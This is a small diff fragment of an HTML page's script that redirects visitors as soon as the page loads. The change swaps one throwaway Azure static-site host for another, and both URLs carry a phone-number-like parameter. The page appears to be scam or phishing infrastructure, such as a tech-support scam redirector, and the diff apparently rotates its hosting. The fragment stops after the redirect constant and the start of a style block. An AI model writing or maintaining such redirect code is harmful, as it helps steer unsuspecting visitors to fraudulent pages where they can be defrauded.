@@ -6,7 +6,7 @@
 <script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://jomm3-secondary.z33.web.core.windows.net/?bcda=(03)-4520-9115";
+            const redirectUrl = "https://jomm1.z8.web.core.windows.net/?bcda=(03)-4520-9115";
 
             const style = document.createElement("style");
             style.textContent = `
